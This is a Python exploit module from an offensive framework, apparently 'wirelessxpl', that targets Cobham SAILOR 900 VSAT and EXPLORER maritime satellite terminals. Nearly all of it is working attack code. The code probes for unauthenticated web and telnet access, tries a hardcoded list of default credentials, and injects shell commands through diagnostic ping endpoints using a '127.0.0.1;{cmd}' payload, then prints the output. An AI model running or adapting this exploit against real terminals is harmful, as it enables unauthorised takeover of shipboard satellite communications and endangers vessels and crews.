# Author: André Henrique (LinkedIn/X: @mrhenrike)
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """Cobham SAILOR 900 VSAT / VSAT7090 Vulnerability Exploitation.

    Exploits known vulnerabilities in Cobham SAILOR 900 VSAT and
    EXPLORER series maritime satellite terminals.  These terminals
    expose an unauthenticated web interface on the shipboard LAN
    that allows configuration changes, firmware upload, and in some
    versions, direct command execution.

    Specific issues include unauthenticated access to the telnet
    daemon, predictable session tokens, and command injection via
    the diagnostic ping functionality.

    Hardware necessario:
      - Acesso de rede ao terminal Cobham VSAT (rede local do navio
        ou estacao terrestre)
      - Nenhum SDR necessario
      - Para testes em laboratorio: Cobham SAILOR 900 VSAT ou
        EXPLORER 710/727 (disponivel em mercado de segunda mao)

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Cobham SAILOR 900 VSAT / VSAT7090 Vulnerability Exploit",
        "description": (
            "Exploits Cobham SAILOR 900 VSAT and EXPLORER maritime "
            "satellite terminals: unauthenticated web interface, "
            "telnet daemon, predictable session tokens, and command "
            "injection via diagnostic ping.  Hardware: acesso de rede "
            "ao terminal; nenhum SDR necessario."
        ),
        "authors": (
            "IOActive (Cobham SATCOM research)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://ioactive.com/satcom-terminals-hacking-by-air-sea-and-land/",
            "https://www.cobham.com/communications-and-connectivity/satcom/",
        ),
        "disclosure_date": "2014-08-06",
        "platform": "linux",
        "arch": "all",
        "privileged": False,
        "targets": (
            "Cobham SAILOR 900 VSAT",
            "Cobham SAILOR 6000 series",
            "Cobham EXPLORER 710",
            "Cobham EXPLORER 727",
            "Thrane & Thrane (legacy Cobham) terminals",
        ),
    }

    target = OptIP("192.168.0.1", "Cobham terminal IP address")
    port = OptPort(80, "Web management port")
    timeout = OptFloat(10.0, "Connection timeout in seconds")
    command = OptString("id", "Command to inject via diagnostic ping")
    telnet_port = OptPort(23, "Telnet daemon port")
    check_telnet = OptBool(True, "Check for unauthenticated telnet access")

    _PING_INJECT_PATHS = [
        "/cgi-bin/webif/system-ping.sh",
        "/cgi-bin/system_commands.cgi",
        "/api/diagnostics/ping",
    ]

    _DEFAULT_CREDS = [
        ("admin", "1234"),
        ("admin", ""),
        ("user", "user"),
        ("installer", "installer"),
    ]

    def _http_get(self, path: str, auth: tuple[str, str] | None = None) -> bytes:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((str(self.target), int(self.port)))

            headers = f"GET {path} HTTP/1.0\r\nHost: {self.target}\r\n"
            if auth:
                import base64
                cred = base64.b64encode(f"{auth[0]}:{auth[1]}".encode()).decode()
                headers += f"Authorization: Basic {cred}\r\n"
            headers += "\r\n"

            sock.sendall(headers.encode())
            response = b""
            while True:
                try:
                    data = sock.recv(4096)
                    if not data:
                        break
                    response += data
                except (TimeoutError, OSError):
                    break
            sock.close()
            return response
        except OSError:
            return b""

    def _check_unauth_web(self) -> bool:
        response = self._http_get("/")
        return b"200 OK" in response and (b"sailor" in response.lower() or b"cobham" in response.lower())

    def _check_telnet_access(self) -> bool:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((str(self.target), int(self.telnet_port)))
            banner = sock.recv(1024)
            sock.close()
            return len(banner) > 0
        except OSError:
            return False

    def _try_default_creds(self) -> tuple[str, str] | None:
        for user, pwd in self._DEFAULT_CREDS:
            response = self._http_get("/", auth=(user, pwd))
            if b"200 OK" in response and b"401" not in response:
                return (user, pwd)
        return None

    def _ping_inject(self, auth: tuple[str, str] | None) -> str | None:
        cmd = str(self.command)
        payload = f"127.0.0.1;{cmd}"
        encoded = payload.replace(" ", "%20").replace(";", "%3B")

        for path in self._PING_INJECT_PATHS:
            url = f"{path}?host={encoded}"
            response = self._http_get(url, auth=auth)
            if b"200 OK" in response:
                parts = response.split(b"\r\n\r\n", 1)
                if len(parts) > 1:
                    body = parts[1].decode(errors="replace").strip()
                    if body and cmd.split()[0] in body.lower():
                        return body
        return None

    @mute
    def check(self) -> bool:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((str(self.target), int(self.port)))
            sock.close()
            return True
        except OSError:
            return False

    def run(self) -> None:
        if not self.target:
            print_error("target IP is required")
            return
        if not self.check():
            print_error(f"Cannot connect to {self.target}:{self.port}")
            return
        print_success(f"Cobham terminal reachable at {self.target}:{self.port}")
        self._exploit()

    def _exploit(self) -> None:
        # Phase 1: Check unauthenticated web access
        print_status("Checking for unauthenticated web interface ...")
        if self._check_unauth_web():
            print_success("Unauthenticated web access confirmed (Cobham/SAILOR)")
        else:
            print_info("Web interface requires authentication or vendor not confirmed")

        # Phase 2: Check telnet
        if self.check_telnet:
            print_status(f"Checking telnet on port {self.telnet_port} ...")
            if self._check_telnet_access():
                print_success(f"Telnet open on {self.target}:{self.telnet_port}")
            else:
                print_info("Telnet not accessible")

        # Phase 3: Try default credentials
        print_status("Trying default credentials ...")
        auth = self._try_default_creds()
        if auth:
            print_success(f"Default credentials accepted: {auth[0]}:{auth[1]}")
        else:
            print_info("No default credentials worked; trying unauthenticated injection")

        # Phase 4: Command injection via diagnostic ping
        print_status(f"Attempting command injection: {self.command}")
        output = self._ping_inject(auth)
        if output:
            print_success(f"Command output:\n{output}")
        else:
            print_error(
                "Injection did not return output.  Terminal may be "
                "patched or paths differ from known versions."
            )
